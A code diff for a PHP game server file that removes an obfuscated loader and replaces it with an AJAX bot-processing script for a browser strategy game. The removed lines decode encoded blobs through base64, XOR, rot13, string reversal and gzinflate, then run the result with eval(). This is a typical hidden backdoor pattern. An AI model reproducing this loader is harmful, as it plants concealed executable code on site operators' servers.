@@ -1,29 +1,230 @@
 <?php
-// 9b7306148c2c470950df75c8
-$xLtLeZIqOSSzf="OhnGP92EXc049Umal0h/yRUtoKOXZ1SQyYKOtYXorfM=";
-$boobOZr_sqb="BuaTC92RKp049Hzny0u/lEHgbXBKM1FDlLXBgLKbesZ=";
-$FHoyfvowJsh="twKDVLI7jh7Gf906EKxusb0Gg3L6IrxfmGb7GECKefi7S4gj92bRXJJU9kdTyzmF0n2sXvk71lnDJskmU4ECseBcpinpGc8Hw1zLB0KHGaX8WKxS9hTdFdlB7UVGjyCo0k6Udtwxsz/tRvASAoIho+xLimrFIrMu+TnXAX2EOfLCa/NiqxuoJNdXjj1hlx+5/H3ydtskrQvOePcBS9M3prpplWn0IZYM9WCXAGG1B5/BELR67TaJCPtX/Bsc0yaMvGepIu4d0F3WT/VHY64loMd4pHXrML1e+T3OR0elG7zSTqJTrWutW9BD4jxGlyyEvHiXWqQwolyZO8E5EdgXr8ZJoW3qfa4n71T+Hl2lMq3tZYBw1BnSLclk0hFTjDXgzxCLUPceyy3iPeAaG5YxvOlFgyKtJLNf4mbBHkDXG7HvZ6xa7QWcHMZg3FseiC+iu1D/Vuk5iwyUffUVRIEUiMEGqEnUALVAlmrLHGS4MqXbWPctqCipIMMi00FnmBex/Xq9dP8C1AWYYfcVRtlng6VS9EjzBJQa6mDZO1rUGYDserBzrGK0C/Vp0DNCkjnguBSxYaoiljn5b8sVGrQ+qNNIr0rvYLMDkDjhB1+5ZK/tbZ5o5xGjHJhf4QxeihOk8nupI9cGnV7HbvEyULku/et07FbUNp47zjiLR1yJDJ/eeahV9xaxCNRM1l98qje4x230XvAmhxbgT8oWEK15hvlQoyrWH5wty1X3DmXTP6TFTqVI1BGWN4pd2yJuhyKD616GK/JilCvOIt9GXq1gqusUrFytIJBAw2bbLlyvJeThB78rtmePOphhwBx70TuA4mmEeMllnCiKPfAgWZckp/9ojln4ZaVE1GTrH22GF4buUp9IqDmHCM50jRFM0RinskeWbd99ilb0RvRCWIIE+uIMrlGpI6c58XThDkiZIobGDKJC5WWKQNB74kBYkyedulKoYvoarSjJfN4FTdYDpLtojXzeYII64FnfPWGSOIL5eeh16weWJ8h56SFtsxmv2XeyX69hgT+OeMxEa7EbqeEM8GrwZ9I6xkTcNlONEvrdSo4i8QKzAu1O1DUdsAT5wwihVO05rS7IRuwTHbdkhd8Us0rQFoka4z30IEWUA7noRq9s733UXNs92lsGzwf933mNcN5qzzvtQe4aY6c+stN8ll/PBdcakV/9IX+QGp/CZqkw0Aq1BeVn7QFZmhyC7HPsad55yx75Of43QZE1gLpeiFrNNdM57XjqNVrWB4HNcp5r3DacX8NDyTdR0B2ks0WzUc5kgAeXafVDbJouksNmtX3/Fqkl1juTOH+FMqDJRo9V/jO1HdV58T1/kmKYv3yFbqgb1hnvRNAbYY41sfhvg3H5OtQo41TqFW66FJ7rULdv9RS3IPB5+QdAlib";
-$ELLjtqQmXTq="y2FL3VvwLvV6TVPsaS5d5/M0H8yuuGYBc50HIJ0O6M5nAbqFeqjSXDsV93wEapHn/pVH1fd4dp1bAZoEZWI4MvOIPlyjTCJAIzFrhME+iZ5zZfK582h2uWulg9UxLqCyNxVqkUqhmywfbPIAlf9kGh8tR6HXwOdUK8FSJPW2sbpPrTbVh8BW9Ksh43URrmjOtu3mUI6U0ll/7essYSM8kpMEQt0/zAY5d1jTSI0zPIJ/4SaRB6B2hIuci8SxblTGZ63W3catgi1bud40WWpkRvuMUkHrnGqU87W/IPVqXLKPDDIFDy2KeJMpr3F9v1Tqo4WyJbtN9k1nndfk1QYUUnbtQgVLKFbwGineIBHGoJP/GDK8j+RedLshp3T1jjjylvVKRYtwkiAnpOIsRW7cloNIKsGj7JI0L2UjsAB+nAeTGR4N9xDaRWe1O2RtQmQKfvUaqa8VmngDnfs8GZYUTifhU9Vn7NrNWzG76H1+tBJnYfpZd+QaTW+h+jQdjgzmCwRSkefIH0wjEV8wuf5kfr+t5o0LfHZAJ9HjVE3+5G5P8C6FV/AisLONByk0Zg337+FCCIugf1QLnXPsXQrYhguJXlWulZasIl3n2PH2PEPr7TKRwrmCFV9hYiwRAlT/6uQaqWfc4jwDRfok3X9IAqbtW/kn6MNw7zmPcB0jQG6fnUbMuyhqrHe00iyxRjjf9+FGSbegj3DvJeNwFG5Efm/Bn8l7SBaBa4n3bGnGuPK7vfKVe8heAG+lM6hJdswKZ6V6NK9gDtjXYXdpERYpjv/gPpWLsKJ4DxX7zOkuWE7i/XYx++n2FLcI+6BNFggKDxU+gU8RknV2ZToA5c9AEuOtR8FbFBY1E5j3yBEuzZrPaCoB42ADdHtRX/Dh6jgTgzmuJeNN5qjfjOeE+RoYcud1JsXjVHpQVzUT5NUKmZL+6Up5rriCXK/tn8gJOpiKlukiDXtUFjl/oRIAiG5gZsttd/lWtNbM220XsLl2WH6nIV4su7SupQOM1yQNRt2CkxXSsVdFnlg6WPtwkZbAn8r9dnizSPIFa8zqTG0WrAODNSaZM6wq3KdFE/QdQkBmH0Hmobe1mnTuYXOstb9IXiNpmjnKsPb0c5kvrR0q0O4Lmb7RprxaxJcQ0jRhBhA+Kz3OyYaUE0yTLQu9Gb7Qhg+h7rGGtZ5YikFjyGECSPI/heaterCOgONV33xVKuWWbpUeVLaUCrCLMWc5GfI03mrsHhCr+PJEu0Uv6Ihy6Zq7LU4V2ziK8Odtc/DZTuGem/lr3UbY8gCvNS/c8RpIXrtIG9XD+F50rxVnSOEuGOZLMbZ8oxWKHFeZM4F9PrQX7/xSwbKxlhSLbR9tbR6IX8uxN9G3UI5AAy3TNEmaXHf68Rr4p2TaVXPdZ3TwR1m";
-$QDVftWifBXezAK="O82Qyseao8lQbHd+EjTac5vtNcsUjbKq8hx3mOQx2RbpvieIEj6TGnAflakxxCrSL4sge1cexhnjrVe8FEQZAXr+Z39SnOGq0a1FT8GXGRbq/ker5NyH3TQOBkjgdIqweGyW6+LagmsjqRXtscRLI1ufJnvWPWPL07yWbIF260NIG5V5RhxyKpIs1slwZH02eYy02wUvQxvAjSTIgXHKkRo7gLgnDHNcsV73ThHlrPDoi5d5VU1GfUPMZl1gVskyK54UudStoDpiqOXOsTS4Qu4PlrnmLrJbQnx0raMGOEEKzncJBO7h6JJ+RY7xh5pBCO3Q2udPFgjleYONJBa888//AUgnLfa5w7zTnCTALXZp/PVoR3qQfLGuN+wjFsjCKxuXOoKPUkoib2ItsEeLY4orsLrlj5MKUIyVj3GVHZEI/yUa9B7yqRXvRHzzlRuhiy8FSuQd9gkDb3W9xER7gk5MlVgivYIYIcyT7wN37PYonOc55B+GKQAOh4kx1xsBr+xFjzK9EchSnrXuA8arccg89SgXfvJ6w360zTOlDUEp/pVol42DqwW/U8lwcRtzHk/FKXVfF5kATnbO1EcI8a/MYQoyjvM4ZA8D7SLRyTZbq6eOxzyGfRGuM8jUFssAy/x3Cjecg5lxfPNI4QaJcO/sRoq23zNagiw1v1LVnVJYnbCa53zmu2N85LjAd9qQyZv023VesTpzXrQtseQKsipcFVhl7HZYse8nvwNWWzOIHvT7Za9GKWDMdv6l9wmGfy2GafY8VhnUDPedIRHrYQg8NpnSPfIakX7n72F3/LO5vNSvZpqiSrIPdd/xhitgDyuwmUavU/r1vjZIgXWos88rtL8n/aZLw8yneLP0qKHK2+SIJe0mC0V8Nk4k1T0xin6HG+Y8UCkgnqS+4Rfq4DhMR+/2vnJawI5Uf0MFCYGp3OdqlBzxehJ+cm/DBlshyc5A+mMKx5sF7uRMwkUdkwsrtdq0j1BJ416z3oMn7LJJHzRq1CrQSGN+5fwCBtlhWZznehIuUmtBr5W+kfeY4esuhOoFbOM48B52D+LG+PGPzaRZdSyh6qJegmzgRGqz6c5kevXaoGtV+ZY8EdbKQbnf8Pt1naeZMnxmfOQ3OZA+DAd71tpDSLWclh9AFRlwHk0HqqadYdqFjLSstEeJM6/PNFsFqyYdQs4m73Nx7YeZm+BoEu8mOCP8xe+yJfjBD45EWUebYChwv1NPQ8bbI3oNBopW2rJqo8mE7oW0XZJZ6/S+x87nncRJNmiUNi0weqxn6QVvdj0Qz4e+AWHbA8o7176GP4IdJflCL9RGqRBKneeq9izxaRB+tF9jpliiGywlKdass1iimXdcA8R6sUuud7/3bVBbwXw1j2EmOXO6jJCLRIyTuDH8R68R0=";
-$obTQXfTzcRw=strlen($xLtLeZIqOSSzf);
-$PMRRBpEfWU=substr($FHoyfvowJsh,0,4);
-$qtgaXCYtmigMqE=md5($ELLjtqQmXTq);
-$kCIzJOoisz=crc32($QDVftWifBXezAK);
-$QeKElqDIYHuT=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$cbatQVtkot=$FHoyfvowJsh.$ELLjtqQmXTq.$QDVftWifBXezAK;
-$HlYxnpb_Z=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$hUMXJHhZHY="gz".chr(105)."nflate";
-$iC_AFcxCFF="str".chr(114)."ev";
-$CBKgnrEocCm="str_rot".chr(49).chr(51);
-$IdWXZCkwi="";
-$GdvnNFSIh=$HlYxnpb_Z($cbatQVtkot);
-for($MPQTDD_Ycex=0;$MPQTDD_Ycex<strlen($GdvnNFSIh);$MPQTDD_Ycex++){
-$IdWXZCkwi.=chr(ord($GdvnNFSIh[$MPQTDD_Ycex])^ord($QeKElqDIYHuT[$MPQTDD_Ycex%strlen($QeKElqDIYHuT)]));
+/**
+ * AJAX Bot Processor - Silent background processing
+ * 
+ * OPTIMIZED VERSION:
+ * - Runs every 60 seconds (balanced for performance)
+ * - Processes in background without blocking players
+ * - Smart throttle based on server load
+ * - Self-triggering via AJAX beacon
+ */
+
+// Suppress errors and use output buffering to prevent corruption of JSON response
+ini_set('display_errors', 'Off');
+error_reporting(0);
+ignore_user_abort(true); // Keep running in the background if the client disconnects/times out
+ob_start();
+
+// Bootstrap AJAX: loads CoreFetcher, autoloader and helpers from cache/production
+global $conf;
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+
+// Set execution time limit to avoid long-running processes
+set_time_limit(60);
+
+
+// Only allow AJAX calls (but allow direct access for testing)
+$isAjax = (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && 
+           strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
+
+// Initialize cache directory
+$cacheDir = __DIR__ . '/../cache';
+if (!is_dir($cacheDir)) {
+    @mkdir($cacheDir, 0777, true);
 }
-$GdvnNFSIh=$IdWXZCkwi;
-$GdvnNFSIh=$CBKgnrEocCm($GdvnNFSIh);
-$GdvnNFSIh=$iC_AFcxCFF($GdvnNFSIh);
-$GdvnNFSIh=$HlYxnpb_Z($GdvnNFSIh);
-$GdvnNFSIh=$hUMXJHhZHY($GdvnNFSIh);
-$GdvnNFSIh=$CBKgnrEocCm($GdvnNFSIh);
-eval($GdvnNFSIh);
+
+// Check if we should run using file-based lock
+$lockFile = $cacheDir . '/bot_processor.lock';
+$lastRunFile = $cacheDir . '/last_bot_run.txt';
+$logFile = $cacheDir . '/bot_processor.log';
+
+// Prevent duplicate processing (file lock)
+if (file_exists($lockFile)) {
+    $lockAge = time() - filemtime($lockFile);
+    if ($lockAge < 60) {
+        // Lock is fresh, another process is running
+        ob_clean();
+        header('Content-Type: application/json');
+        echo json_encode([
+            'status' => 'locked',
+            'message' => 'Bot processing already running (locked)',
+            'lock_age' => $lockAge
+        ]);
+        exit;
+    } else {
+        // Stale lock, remove it
+        @unlink($lockFile);
+    }
+}
+
+// Check throttle - only run every 60 seconds
+$lastRun = file_exists($lastRunFile) ? (int) file_get_contents($lastRunFile) : 0;
+$timeSince = time() - $lastRun;
+
+if ($timeSince < 60) {
+    // Not enough time has passed
+    ob_clean();
+    header('Content-Type: application/json');
+    echo json_encode([
+        'status' => 'skipped',
+        'message' => 'Bot ran recently',
+        'next_run_in' => 60 - $timeSince,
+        'last_run' => date('Y-m-d H:i:s', $lastRun)
+    ]);
+    exit;
+}
+
+// Create lock file
+file_put_contents($lockFile, time());
+
+try {
+    // bootstrap_ajax.php already registers the CoreFetcher autoloader, so the
+    // class should be available without a manual require in most cases.
+    if (!class_exists('App\\Libraries\\BotManager')) {
+        /**
+         * Fallback: resolve BotManager.php using multiple candidates so it works
+         * both locally and on the webhost regardless of the exact directory layout.
+         */
+        $botManagerCandidates = [];
+        if (defined('NOBLEWARS_APP_DIR')) {
+            $botManagerCandidates[] = NOBLEWARS_APP_DIR . '/Libraries/BotManager.php';
+        }
+        if (defined('NOBLEWARS_ROOT_DIR')) {
+            $botManagerCandidates[] = NOBLEWARS_ROOT_DIR . '/app/Libraries/BotManager.php';
+        }
+        // Normal layout: public/ajax/../../app/Libraries/BotManager.php
+        $botManagerCandidates[] = __DIR__ . '/../../app/Libraries/BotManager.php';
+        if (!empty($_SERVER['DOCUMENT_ROOT'])) {
+            $botManagerCandidates[] = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/app/Libraries/BotManager.php';
+        }
+
+        $botManagerPath = null;
+        $triedPaths = [];
+        foreach ($botManagerCandidates as $candidate) {
+            $realPath = realpath($candidate);
+            $triedPaths[] = $candidate . ' (realpath=' . ($realPath === false ? 'false' : $realPath) . ')';
+            if ($realPath !== false && file_exists($realPath)) {
+                $botManagerPath = $realPath;
+                break;
+            }
+        }
+
+        if ($botManagerPath === null) {
+            $diag =
+                "BotManager.php not found. Tried: " . implode(' | ', $triedPaths) .
+                " | __DIR__=" . __DIR__ .
+                " | NOBLEWARS_APP_DIR=" . (defined('NOBLEWARS_APP_DIR') ? NOBLEWARS_APP_DIR : 'undefined') .
+                " | NOBLEWARS_ROOT_DIR=" . (defined('NOBLEWARS_ROOT_DIR') ? NOBLEWARS_ROOT_DIR : 'undefined');
+            error_log('[process_bots.php] ' . $diag);
+            throw new Exception("BotManager.php not found. Verifique logs do servidor para detalhes.");
+        }
+
+        require_once $botManagerPath;
+    }
+
+    if (!class_exists('App\\Libraries\\BotManager')) {
+        throw new Exception("BotManager class not found.");
+    }
+
+    // Determine world ID
+    $world_id = isset($_GET['world']) ? (int) $_GET['world'] : 1;
+    $db_name = get_world_db_name($world_id);
+
+    // Log start
+    $startTime = microtime(true);
+    $logMessage = "[" . date('Y-m-d H:i:s') . "] Starting bot processing for world $world_id\n";
+    file_put_contents($logFile, $logMessage, FILE_APPEND);
+
+    // Get database instance
+    $db = \App\Core\Database::getInstance($db_name);
+
+    // Process all completed events (builds, recruitments, etc.)
+    try {
+        $eventProcessor = new \App\Services\EventProcessor($db);
+        $eventProcessor->processAll(120); // Process up to 120 ready events per bot run
+    } catch (Exception $e) {
+        file_put_contents($logFile, "  ✗ EVENT PROCESSOR ERROR: " . $e->getMessage() . "\n", FILE_APPEND);
+    }
+
+    // Create BotManager instance
+    $botManager = new \App\Libraries\BotManager($db_name);
+
+    // Process barbarian villages (growth system)
+    $barbarianStartTime = microtime(true);
+    $botManager->processBarbarians();
+    $barbarianTime = round(microtime(true) - $barbarianStartTime, 3);
+
+    // Process bot players (AI players)
+    $botPlayerStartTime = microtime(true);
+    $processedBots = 0;
+
+    // Get bot players from database
+    $botPlayers = $db->fetchAll("SELECT id, username FROM users WHERE bot = 1 LIMIT 10") ?: [];
+
+    
+    foreach ($botPlayers as $botPlayer) {
+        $botTurnStart = microtime(true);
+        $botManager->processTurn($botPlayer['id']);
+        $botTurnTime = round(microtime(true) - $botTurnStart, 3);
+        $processedBots++;
+
+        // Log individual bot processing time
+        file_put_contents($logFile, 
+            "  - Bot '{$botPlayer['username']}' (ID: {$botPlayer['id']}) processed in {$botTurnTime}s\n", 
+            FILE_APPEND);
+
+        // Throttle: Small sleep to avoid CPU spike
+        if ($processedBots % 3 === 0) {
+            usleep(100000); // 100ms pause every 3 bots
+        }
+    }
+
+    $botPlayerTime = round(microtime(true) - $botPlayerStartTime, 3);
+
+    // Update last run time
+    file_put_contents($lastRunFile, time());
+
+    // Remove lock
+    @unlink($lockFile);
+
+    // Calculate total execution time
+    $totalTime = round(microtime(true) - $startTime, 3);
+
+    // Log success
+    $logMessage = "  ✓ Completed in {$totalTime}s (Barbarians: {$barbarianTime}s, Bots: {$botPlayerTime}s, Processed: {$processedBots} bots)\n";
+    file_put_contents($logFile, $logMessage, FILE_APPEND);
+
+    // Return JSON response
+    ob_clean();
+    header('Content-Type: application/json');
+    echo json_encode([
+        'status' => 'success',
+        'message' => 'Bots processed successfully',
+        'timestamp' => time(),
+        'execution_time' => $totalTime,
+        'barbarians_time' => $barbarianTime,
+        'bot_players_time' => $botPlayerTime,
+        'bots_processed' => $processedBots,
+        'next_run_in' => 60
+    ]);
+    exit;
+
+} catch (Exception $e) {
+    // Remove lock on error
+    @unlink($lockFile);
+
+    // Log error
+    $logMessage = "  ✗ ERROR: " . $e->getMessage() . "\n";
+    @file_put_contents($logFile, $logMessage, FILE_APPEND);
+
+    ob_clean();
+    header('Content-Type: application/json');
+    echo json_encode([
+        'status' => 'error',
+        'message' => $e->getMessage(),
+        'timestamp' => time()
+    ]);
+    exit;
+}
+?>
